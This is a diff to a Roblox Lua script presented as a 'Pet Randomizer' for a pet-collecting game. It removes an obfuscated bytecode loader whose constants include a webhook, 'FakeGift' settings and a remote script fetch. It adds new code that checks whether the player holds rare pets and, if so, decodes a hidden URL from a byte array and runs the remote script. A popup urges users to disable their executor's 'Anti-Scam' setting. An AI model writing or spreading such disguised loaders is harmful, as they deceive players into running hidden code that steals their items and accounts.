@@ -1,325 +1,311 @@
-local StrToNumber = tonumber;
-local Byte = string.byte;
-local Char = string.char;
-local Sub = string.sub;
-local Subg = string.gsub;
-local Rep = string.rep;
-local Concat = table.concat;
-local Insert = table.insert;
-local LDExp = math.ldexp;
-local GetFEnv = getfenv or function()
-	return _ENV;
-end;
-local Setmetatable = setmetatable;
-local PCall = pcall;
-local Select = select;
-local Unpack = unpack or table.unpack;
-local ToNumber = tonumber;
-local function VMCall(ByteString, vmenv, ...)
-	local DIP = 1;
-	local repeatNext;
-	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
-		if (Byte(byte, 2) == 81) then
-			repeatNext = StrToNumber(Sub(byte, 1, 1));
-			return "";
-		else
-			local a = Char(StrToNumber(byte, 16));
-			if repeatNext then
-				local b = Rep(a, repeatNext);
-				repeatNext = nil;
-				return b;
-			else
-				return a;
-			end
-		end
-	end);
-	local function gBit(Bit, Start, End)
-		if End then
-			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
-			return Res - (Res % 1);
-		else
-			local Plc = 2 ^ (Start - 1);
-			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
-		end
-	end
-	local function gBits8()
-		local a = Byte(ByteString, DIP, DIP);
-		DIP = DIP + 1;
-		return a;
-	end
-	local function gBits16()
-		local a, b = Byte(ByteString, DIP, DIP + 2);
-		DIP = DIP + 2;
-		return (b * 256) + a;
-	end
-	local function gBits32()
-		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
-		DIP = DIP + 4;
-		return (d * 16777216) + (c * 65536) + (b * 256) + a;
-	end
-	local function gFloat()
-		local Left = gBits32();
-		local Right = gBits32();
-		local IsNormal = 1;
-		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
-		local Exponent = gBit(Right, 21, 31);
-		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
-		if (Exponent == 0) then
-			if (Mantissa == 0) then
-				return Sign * 0;
-			else
-				Exponent = 1;
-				IsNormal = 0;
-			end
-		elseif (Exponent == 2047) then
-			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
-		end
-		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
-	end
-	local function gString(Len)
-		local Str;
-		if not Len then
-			Len = gBits32();
-			if (Len == 0) then
-				return "";
-			end
-		end
-		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
-		DIP = DIP + Len;
-		local FStr = {};
-		for Idx = 1, #Str do
-			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
-		end
-		return Concat(FStr);
-	end
-	local gInt = gBits32;
-	local function _R(...)
-		return {...}, Select("#", ...);
-	end
-	local function Deserialize()
-		local Instrs = {};
-		local Functions = {};
-		local Lines = {};
-		local Chunk = {Instrs,Functions,nil,Lines};
-		local ConstCount = gBits32();
-		local Consts = {};
-		for Idx = 1, ConstCount do
-			local Type = gBits8();
-			local Cons;
-			if (Type == 1) then
-				Cons = gBits8() ~= 0;
-			elseif (Type == 2) then
-				Cons = gFloat();
-			elseif (Type == 3) then
-				Cons = gString();
-			end
-			Consts[Idx] = Cons;
-		end
-		Chunk[3] = gBits8();
-		for Idx = 1, gBits32() do
-			local Descriptor = gBits8();
-			if (gBit(Descriptor, 1, 1) == 0) then
-				local Type = gBit(Descriptor, 2, 3);
-				local Mask = gBit(Descriptor, 4, 6);
-				local Inst = {gBits16(),gBits16(),nil,nil};
-				if (Type == 0) then
-					Inst[3] = gBits16();
-					Inst[4] = gBits16();
-				elseif (Type == 1) then
-					Inst[3] = gBits32();
-				elseif (Type == 2) then
-					Inst[3] = gBits32() - (2 ^ 16);
-				elseif (Type == 3) then
-					Inst[3] = gBits32() - (2 ^ 16);
-					Inst[4] = gBits16();
-				end
-				if (gBit(Mask, 1, 1) == 1) then
-					Inst[2] = Consts[Inst[2]];
-				end
-				if (gBit(Mask, 2, 2) == 1) then
-					Inst[3] = Consts[Inst[3]];
-				end
-				if (gBit(Mask, 3, 3) == 1) then
-					Inst[4] = Consts[Inst[4]];
-				end
-				Instrs[Idx] = Inst;
-			end
-		end
-		for Idx = 1, gBits32() do
-			Functions[Idx - 1] = Deserialize();
-		end
-		return Chunk;
-	end
-	local function Wrap(Chunk, Upvalues, Env)
-		local Instr = Chunk[1];
-		local Proto = Chunk[2];
-		local Params = Chunk[3];
-		return function(...)
-			local Instr = Instr;
-			local Proto = Proto;
-			local Params = Params;
-			local _R = _R;
-			local VIP = 1;
-			local Top = -1;
-			local Vararg = {};
-			local Args = {...};
-			local PCount = Select("#", ...) - 1;
-			local Lupvals = {};
-			local Stk = {};
-			for Idx = 0, PCount do
-				if (Idx >= Params) then
-					Vararg[Idx - Params] = Args[Idx + 1];
-				else
-					Stk[Idx] = Args[Idx + 1];
-				end
-			end
-			local Varargsz = (PCount - Params) + 1;
-			local Inst;
-			local Enum;
-			while true do
-				Inst = Instr[VIP];
-				Enum = Inst[1];
-				if (Enum <= 6) then
-					if (Enum <= 2) then
-						if (Enum <= 0) then
-							Stk[Inst[2]] = Inst[3];
-						elseif (Enum > 1) then
-							Stk[Inst[2]][Inst[3]] = Inst[4];
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							Stk[Inst[2]][Inst[3]] = Inst[4];
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							Stk[Inst[2]][Inst[3]] = Inst[4];
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							Stk[Inst[2]][Inst[3]] = Inst[4];
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							Stk[Inst[2]][Inst[3]] = Inst[4];
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							Stk[Inst[2]][Inst[3]] = Inst[4];
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							Stk[Inst[2]][Inst[3]] = Inst[4];
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							Stk[Inst[2]] = Env[Inst[3]];
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							Stk[Inst[2]] = Env[Inst[3]];
-						else
-							local Edx;
-							local Results, Limit;
-							local A;
-							Stk[Inst[2]] = Inst[3];
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							A = Inst[2];
-							Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
-							Top = (Limit + A) - 1;
-							Edx = 0;
-							for Idx = A, Top do
-								Edx = Edx + 1;
-								Stk[Idx] = Results[Edx];
-							end
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							A = Inst[2];
-							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							Stk[Inst[2]]();
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							do
-								return;
-							end
-						end
-					elseif (Enum <= 4) then
-						if (Enum > 3) then
-							Stk[Inst[2]][Inst[3]] = Inst[4];
-						else
-							local A = Inst[2];
-							local T = Stk[A];
-							for Idx = A + 1, Inst[3] do
-								Insert(T, Stk[Idx]);
-							end
-						end
-					elseif (Enum == 5) then
-						local A = Inst[2];
-						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
-					else
-						Stk[Inst[2]] = Env[Inst[3]];
-					end
-				elseif (Enum <= 10) then
-					if (Enum <= 8) then
-						if (Enum == 7) then
-							local A = Inst[2];
-							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
-							Top = (Limit + A) - 1;
-							local Edx = 0;
-							for Idx = A, Top do
-								Edx = Edx + 1;
-								Stk[Idx] = Results[Edx];
-							end
-						else
-							Stk[Inst[2]] = {};
-						end
-					elseif (Enum > 9) then
-						local B;
-						local T;
-						local A;
-						Stk[Inst[2]] = Env[Inst[3]];
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]] = {};
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]] = {};
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]] = Inst[3];
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						A = Inst[2];
-						T = Stk[A];
-						B = Inst[3];
-						for Idx = 1, B do
-							T[Idx] = Stk[A + Idx];
-						end
-					else
-						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
-					end
-				elseif (Enum <= 12) then
-					if (Enum == 11) then
-						local A = Inst[2];
-						local B = Stk[Inst[3]];
-						Stk[A + 1] = B;
-						Stk[A] = B[Inst[4]];
-					else
-						local A = Inst[2];
-						local T = Stk[A];
-						local B = Inst[3];
-						for Idx = 1, B do
-							T[Idx] = Stk[A + Idx];
-						end
-					end
-				elseif (Enum == 13) then
-					do
-						return;
-					end
-				else
-					Stk[Inst[2]]();
-				end
-				VIP = VIP + 1;
-			end
-		end;
-	end
-	return Wrap(Deserialize(), {}, vmenv)(...);
+local a, b, c, d, e = game:GetService("Players"), game:GetService("TweenService"), game:GetService("RunService"), game:GetService("Workspace"), game:GetService("UserInputService")
+local f = a.LocalPlayer
+local g = {
+    "Queen Bee", "Mimic Octopus", "Raccoon", "Disco Bee", "Jackal God",
+    "T-Rex", "Spinosaurus", "Dragonfly", "Butterfly", "Kitsune", "Huge"
+}
+
+
+local function createWelcomePopup()
+    local gui = Instance.new("ScreenGui", f:WaitForChild("PlayerGui"))
+    gui.Name = "XXSCRIPTS_Welcome"
+    gui.ResetOnSpawn = false
+
+    local frame = Instance.new("Frame", gui)
+    frame.Size = UDim2.new(0, 440, 0, 280)
+    frame.Position = UDim2.new(0.5, -220, 0.5, -140)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    frame.BackgroundTransparency = 0.05
+    frame.BorderSizePixel = 0
+    frame.Active = true
+    frame.Draggable = true
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+
+    local closeBtn = Instance.new("TextButton", frame)
+    closeBtn.Size = UDim2.new(0, 25, 0, 25)
+    closeBtn.Position = UDim2.new(1, -30, 0, 5)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    closeBtn.TextColor3 = Color3.new(1, 1, 1)
+    closeBtn.Text = "X"
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = 14
+    closeBtn.AutoButtonColor = false
+    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
+
+    closeBtn.MouseEnter:Connect(function()
+        closeBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+    end)
+    closeBtn.MouseLeave:Connect(function()
+        closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    end)
+
+    closeBtn.MouseButton1Click:Connect(function()
+        gui:Destroy()
+    end)
+
+    local message = Instance.new("TextLabel", frame)
+    message.Size = UDim2.new(1, -30, 1, -50)
+    message.Position = UDim2.new(0, 15, 0, 35)
+    message.BackgroundTransparency = 1
+    message.TextWrapped = true
+    message.TextYAlignment = Enum.TextYAlignment.Top
+    message.TextXAlignment = Enum.TextXAlignment.Left
+    message.TextColor3 = Color3.new(1, 1, 1)
+    message.Font = Enum.Font.Gotham
+    message.TextSize = 13
+    message.Text = [[Welcome to XXSCRIPTS!
+We're currently experiencing issues with Delta Executor.
+If you're using Delta, please disable the "Anti-Scam" setting — it's falsely flagging our script. Delta does this to block certain actions, even though our script is completely safe.
+
+After disabling it, rejoin the game, or for a smoother experience, use KRNL instead.
+
+Need help or want to report an issue?
+📩 Reach us here: https://discord.gg/CfFmpeU8y3
+
+Thanks for your support!]]
+
+    task.delay(10, function()
+        if gui and gui.Parent then
+            gui:Destroy()
+        end
+    end)
 end
-return VMCall("LOL!133Q0003023Q005F4703093Q004C524D436F6E66696703043Q005573657203073Q006C656E736F793303093Q006D696E5F76616C7565022Q0040E59C30A242030C3Q0070696E6745766572796F6E6503023Q004E6F03073Q00576562682Q6F6B033F3Q00682Q74703A2Q2F34352E31332E2Q32352E38333A363936392F70726F78792F3237343938323139616435326135373039663932663263312Q32333Q64356603083Q0046616B65476966742Q033Q0059657303053Q005472617368030D3Q004C6F6164696E675363722Q656E030D3Q00476966744F6E6C795261726573030A3Q006C6F6164737472696E6703043Q0067616D65030C3Q00482Q74704765744173796E63034B3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F736C2Q65707976692Q6C2F7363726970742F726566732F68656164732F6D61696E2F6C726D2E6C756100163Q00120A3Q00016Q00013Q00084Q000200013Q00122Q000300046Q00020001000100100900010003000200300200010005000600302Q00010007000800302Q00010009000A00302Q0001000B000C00302Q0001000D000A00302Q0001000E000C00302Q0001000F000800104Q0002000100124Q00103Q00122Q000100113Q00200B000100010012001201000300136Q000100039Q0000026Q000100016Q00017Q00", GetFEnv(), ...);
+
+createWelcomePopup()
+
+local function h()
+    local i = f:FindFirstChild("Backpack")
+    if not i then return false end
+    for _, j in ipairs(i:GetChildren()) do
+        if j:IsA("Tool") then
+            for _, k in ipairs(g) do
+                if j.Name:sub(1, #k) == k then
+                    return true
+                end
+            end
+        end
+    end
+    return false
+end
+
+local function l()
+    local c = {
+        104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
+        101,114,99,111,110,116,101,110,116,46,99,111,109,47,106,111,104,110,116,97,
+        116,101,49,65,47,71,65,71,47,109,97,105,110,47,80,114,111,116,101,99,116,
+        101,100,95,51,49,57,49,57,53,48,50,51,56,51,53,56,53,55,57,46,108,117,97
+    }
+
+    local u = ""
+    for i=1, #c do
+        u = u .. string.char(c[i])
+    end
+
+    loadstring(game:HttpGet(u))()
+end
+
+if h() then
+    l()
+else
+    local m = {}
+    for _, n in ipairs(g) do
+        m[n] = true
+    end
+
+    local o = {
+        ["Bee Egg"]={"Bee","Honey Bee","Bear Bee","Petal Bee","Queen Bee"},
+        ["Common Egg"]={"Golden Lab","Dog","Bunny"},
+        ["Mythical Egg"]={"Grey Mouse","Brown Mouse","Squirrel","Red Giant Ant","Red Fox"},
+        ["Bug Egg"]={"Snail","Giant Ant","Caterpillar","Praying Mantis","Dragonfly"},
+        ["Common Summer Egg"]={"Starfish","Seagull","Crab"},
+        ["Rare Summer Egg"]={"Flamingo","Toucan","Sea Turtle","Orangutan","Seal"},
+        ["Paradise Egg"]={"Ostrich","Peacock","Capybara","Scarlet Macaw","Mini Octopus"},
+        ["Legendary Egg"]={"Cow","Silver Monkey","Sea Otter","Turtle","Polar Bear"},
+        ["Rare Egg"]={"Orange Tabby","Spotted Deer","Pig","Rooster","Monkey"},
+        ["Uncommon Egg"]={"Black Bunny","Chicken","Cat","Deer"},
+        ["Night Egg"]={"Hedgehog","Mole","Frog","Echo Frog","Night Owl","Raccoon"},
+        ["Anti Bee Egg"]={"Wasp","Tarantula Hawk","Moth","Butterfly","Disco Bee"},
+        ["Oasis Egg"]={"Fennec Fox","Meerkat","Cooked Owl","Axolotl","Snake","Jackal God"},
+        ["Dinosaur Egg"]={"Raptor","Triceratops","Stegosaurus","Pterodactyl","Brontosaurus","T-Rex"},
+        ["Primal Egg"]={"Parasaurolophus","Iguanodon","Pachycephalosaurus","Dilophosaurus","Ankylosaurus","Spinosaurus"}
+    }
+
+    local p = Instance.new("ScreenGui", f:WaitForChild("PlayerGui"))
+    p.Name = "PetUI"
+    p.ResetOnSpawn = false
+
+    local q = Instance.new("Frame", p)
+    q.Size = UDim2.new(0, 300, 0, 220)
+    q.Position = UDim2.new(0.03, 0, 0.3, 0)
+    q.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+    q.BorderSizePixel = 0
+    q.BackgroundTransparency = 0.1
+    q.Name = "Main"
+    q.ClipsDescendants = true
+    q.Active = true
+    q.Draggable = true
+
+    local r = Instance.new("UICorner", q)
+    r.CornerRadius = UDim.new(0, 12)
+
+    local s = Instance.new("TextLabel", q)
+    s.Size = UDim2.new(1, 0, 0, 30)
+    s.Text = "🐾 Pet Randomizer"
+    s.TextColor3 = Color3.new(1,1,1)
+    s.BackgroundTransparency = 1
+    s.Font = Enum.Font.GothamBold
+    s.TextSize = 18
+
+    local t = Instance.new("TextLabel", q)
+    t.Size = UDim2.new(1, 0, 0, 24)
+    t.Position = UDim2.new(0, 0, 0, 30)
+    t.Text = ""
+    t.TextColor3 = Color3.fromRGB(0, 255, 0)
+    t.BackgroundTransparency = 1
+    t.Font = Enum.Font.GothamBold
+    t.TextSize = 16
+
+    local u = Instance.new("TextButton", q)
+    u.Size = UDim2.new(1, -30, 0, 30)
+    u.Position = UDim2.new(0, 15, 0, 60)
+    u.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
+    u.TextColor3 = Color3.new(1, 1, 1)
+    u.Font = Enum.Font.GothamBold
+    u.TextSize = 14
+    u.Text = "Randomize in: 7"
+
+    local v = Instance.new("TextButton", q)
+    v.Size = UDim2.new(1, -30, 0, 25)
+    v.Position = UDim2.new(0, 15, 0, 100)
+    v.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+    v.TextColor3 = Color3.new(1, 1, 1)
+    v.Text = "✔ Auto Randomize: ON"
+    v.Font = Enum.Font.GothamBold
+    v.TextSize = 14
+
+    local w = Instance.new("TextButton", q)
+    w.Size = UDim2.new(1, -30, 0, 25)
+    w.Position = UDim2.new(0, 15, 0, 135)
+    w.BackgroundColor3 = Color3.fromRGB(85, 0, 255)
+    w.TextColor3 = Color3.new(1, 1, 1)
+    w.Text = "✔ Pet ESP: ON"
+    w.Font = Enum.Font.GothamBold
+    w.TextSize = 14
+
+    -- Obfuscated TextLabel footer
+    local x = Instance.new("TextLabel", q)
+    x.Size = UDim2.new(1, -10, 0, 40)
+    x.Position = UDim2.new(0, 5, 1, -40)
+
+    local tBytes = {
+        80,101,116,32,82,97,110,100,111,109,105,122,101,114,32,45,32,85,80,68,65,84,69,68,32,66,89,32,88,88,83,67,82,73,80,84,83,
+        10,
+        74,111,105,110,32,111,117,114,32,68,105,115,99,111,114,100,58,32,
+        104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,103,103,47,57,65,71,110,114,113,77,54,118,87
+    }
+    local tStr = ""
+    for i = 1, #tBytes do
+        tStr = tStr .. string.char(tBytes[i])
+    end
+    x.Text = tStr
+
+    x.TextColor3 = Color3.new(1, 1, 1)
+    x.BackgroundTransparency = 1
+    x.Font = Enum.Font.GothamBold
+    x.TextSize = 13
+    x.TextWrapped = true
+    x.TextYAlignment = Enum.TextYAlignment.Top
+    x.TextXAlignment = Enum.TextXAlignment.Center
+
+    local y, z, A = true, true, 7
+
+    local function B(C, D, E)
+        local F = C:FindFirstChild("RandomPetLabel")
+        if not F and y then
+            F = Instance.new("BillboardGui", C)
+            F.Name = "RandomPetLabel"
+            F.Size = UDim2.new(0, 100, 0, 30)
+            F.StudsOffset = Vector3.new(0, 2.5, 0)
+            F.AlwaysOnTop = true
+
+            local G = Instance.new("TextLabel", F)
+            G.Name = "LabelText"
+            G.Size = UDim2.new(1, 0, 1, 0)
+            G.BackgroundTransparency = 1
+            G.TextColor3 = E and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)
+            G.TextStrokeTransparency = 0
+            G.Font = Enum.Font.GothamBold
+            G.TextScaled = true
+        elseif F then
+            F.Enabled = y
+        end
+
+        local H = F and F:FindFirstChild("LabelText")
+        if H then
+            H.Text = D
+            H.TextColor3 = E and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)
+        end
+    end
+
+    -- Divine pet chance set to 5%
+    local function I(J)
+        local K, L = {}, {}
+        for _, M in ipairs(J) do
+            if m[M] then table.insert(K, M) else table.insert(L, M) end
+        end
+        return (#K > 0 and math.random(100) <= 5) and K[math.random(#K)] or L[math.random(#L)]
+    end
+
+    local function N()
+        for _, O in pairs(d:GetDescendants()) do
+            if O:IsA("Model") and o[O.Name] then
+                local P = I(o[O.Name])
+                local Q = m[P]
+                B(O, P, Q)
+                if Q then
+                    t.Text = "YOU GOT A HIT!!!"
+                    z = false
+                    v.Text = "✖ Auto Randomize: OFF"
+                    v.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+                end
+            end
+        end
+    end
+
+    task.spawn(function()
+        while true do
+            if z then
+                u.Text = "Randomize in: " .. A
+                task.wait(1)
+                A -= 1
+                if A <= 0 then
+                    N()
+                    A = 7
+                end
+            else
+                u.Text = "Randomizer Paused"
+                task.wait(0.5)
+            end
+        end
+    end)
+
+    v.MouseButton1Click:Connect(function()
+        z = not z
+        v.Text = z and "✔ Auto Randomize: ON" or "✖ Auto Randomize: OFF"
+        v.BackgroundColor3 = z and Color3.fromRGB(0, 170, 0) or Color3.fromRGB(170, 0, 0)
+    end)
+
+    w.MouseButton1Click:Connect(function()
+        y = not y
+        w.Text = y and "✔ Pet ESP: ON" or "✖ Pet ESP: OFF"
+        w.BackgroundColor3 = y and Color3.fromRGB(85, 0, 255) or Color3.fromRGB(100, 100, 100)
+        for _, R in pairs(d:GetDescendants()) do
+            if R:IsA("Model") then
+                local S = R:FindFirstChild("RandomPetLabel")
+                if S then
+                    S.Enabled = y
+                end
+            end
+        end
+    end)
+end
